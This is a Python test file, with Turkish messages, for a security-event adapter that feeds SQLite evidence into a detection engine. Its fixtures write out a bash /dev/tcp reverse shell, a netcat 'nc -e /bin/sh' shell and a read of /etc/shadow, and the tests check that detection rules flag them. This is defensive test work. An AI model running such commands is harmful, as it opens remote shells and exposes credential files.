"""Satsuma Core -> Atom adaptörü testleri (Evidence V2 ve eski `records` yolu)."""
from __future__ import annotations
import hashlib, json, sqlite3
from pathlib import Path

from satsuma_engine.adapters.satsuma_core import CoreSource, CoreSourceError, export_jsonl, main
from satsuma_engine.engine import Engine
from satsuma_engine.rule_model import load_ruleset
from satsuma_engine.schema_store import validate_instance

ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT / "satsuma_engine" / "rules"
DDL = """CREATE TABLE evidence_v2 (evidence_id TEXT PRIMARY KEY, source_family TEXT NOT NULL, kind TEXT NOT NULL,
 observed_at TEXT, ingested_at REAL NOT NULL, severity TEXT NOT NULL, body TEXT NOT NULL);"""


def _evd(eid, family, kind, ts, **parts):
    body = {"evidence_id": eid, "source_family": family, "kind": kind, "observed_at": ts,
            "ingested_at": "2026-10-10T09:00:00Z", "severity": "info", "source_event_id": None,
            "process": None, "file": None, "network": None, "audit_serial": None, "attributes": {}, "provenance": {}}
    body.update(parts)
    return body


def _make_db(path: Path, bodies) -> Path:
    db = sqlite3.connect(path)
    db.executescript(DDL)
    for b in bodies:
        db.execute("INSERT INTO evidence_v2 VALUES(?,?,?,?,?,?,?)",
                   (b["evidence_id"], b["source_family"], b["kind"], b["observed_at"], 0.0, b["severity"], json.dumps(b)))
    db.commit(); db.close()
    return path


def _sample(tmp_path):
    proc = {"boot_id": "b1", "pid": 4242, "starttime": 111, "exe": "/usr/bin/bash", "uid": 33, "ppid": 1, "gid": None,
            "identity_key": "b1|4242|111"}
    return _make_db(tmp_path / "core.db", [
        _evd("EVD2-1", "process", "process_start", "2026-10-10T09:00:01Z", process=proc,
             attributes={"cmd": "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1", "host": "ws1"},
             network={"dst_ip": "203.0.113.45", "dst_port": 4444}),
        _evd("EVD2-2", "audit", "file_open", "2026-10-10T09:00:09Z", process=proc,
             file={"path": "/etc/shadow", "device": 253, "inode": 7}, attributes={"host": "ws1", "operation": "read"}),
        _evd("EVD2-3", "suricata", "alert", "2026-10-10T09:00:12Z", network={"src_ip": "10.0.0.5", "dst_ip": "203.0.113.45", "dst_port": 4444}),
    ])


def test_evidence_v2_backend_maps_kinds_and_identity(tmp_path):
    src = CoreSource(_sample(tmp_path))
    assert src.backend == "evidence_v2"
    ev = list(src.iter_events())
    assert [e["event"]["kind"] for e in ev] == ["process", "file", "network"]
    assert ev[0]["source"] == "sys_proc" and ev[1]["source"] == "sys_audit"
    assert ev[0]["event"]["process_key"] == "b1|4242|111" == ev[1]["event"]["process_key"]
    assert ev[1]["event"]["file_path"] == "/etc/shadow"
    assert ev[0]["event"]["dest_ip"] == "203.0.113.45"


def test_events_are_schema_valid(tmp_path):
    for env in CoreSource(_sample(tmp_path)).iter_events():
        env.pop("cursor")
        assert validate_instance("event", env) == []


def test_database_is_never_modified(tmp_path):
    db = _sample(tmp_path)
    before = hashlib.sha256(db.read_bytes()).hexdigest()
    export_jsonl(str(db), tmp_path / "o.jsonl", tmp_path / "s.json")
    assert hashlib.sha256(db.read_bytes()).hexdigest() == before


def test_cursor_makes_export_incremental(tmp_path):
    db = _sample(tmp_path); out = tmp_path / "o.jsonl"; st = tmp_path / "s.json"
    assert export_jsonl(str(db), out, st)["exported"] == 3
    assert export_jsonl(str(db), out, st)["exported"] == 0
    con = sqlite3.connect(db)
    b = _evd("EVD2-4", "process", "process_start", "2026-10-10T09:05:00Z", attributes={"cmd": "ls"})
    con.execute("INSERT INTO evidence_v2 VALUES(?,?,?,?,?,?,?)", (b["evidence_id"], "process", "process_start", b["observed_at"], 0.0, "info", json.dumps(b)))
    con.commit(); con.close()
    assert export_jsonl(str(db), out, st)["exported"] == 1
    assert len(out.read_text().splitlines()) == 4


def test_atom_scan_on_core_events_finds_reverse_shell_and_shadow_read(tmp_path):
    db = _sample(tmp_path); out = tmp_path / "o.jsonl"
    export_jsonl(str(db), out)
    rules, _ = load_ruleset([RULES], strict=False)
    result = Engine(rules).scan_file(out)
    ids = {f["rule_id"] for f in result.findings_as_dicts()}
    assert {"SATSUMA-EXEC-001", "SATSUMA-CRED-001"} <= ids
    assert len(ids) == 2, "zararsız olay (ls) bulgu üretmemeli"


def test_legacy_records_backend(tmp_path):
    p = tmp_path / "core.db"; con = sqlite3.connect(p)
    con.execute("CREATE TABLE records(id INTEGER PRIMARY KEY, kind TEXT NOT NULL, created REAL NOT NULL, body TEXT NOT NULL)")
    con.execute("INSERT INTO records(kind,created,body) VALUES(?,?,?)",
                ("sys_proc", 1.0, json.dumps({"id": "x", "source": "sys_proc", "event": {"timestamp": "2026-10-10T09:00:00Z", "kind": "process", "cmd": "nc -e /bin/sh 1.2.3.4 9"}})))
    con.commit(); con.close()
    src = CoreSource(p, default_host="h1")
    assert src.backend == "records"
    ev = list(src.iter_events())
    assert ev[0]["event"]["cmd"].startswith("nc -e") and ev[0]["event"]["host"] == "h1"


def test_missing_or_unknown_db_reports_error(tmp_path, capsys):
    assert main(["--db", str(tmp_path / "yok.db"), "--out", str(tmp_path / "o.jsonl")]) == 2
    assert "HATA" in capsys.readouterr().err
    empty = tmp_path / "e.db"; sqlite3.connect(empty).close()
    try:
        CoreSource(empty); raise AssertionError("beklenen hata gelmedi")
    except CoreSourceError:
        pass
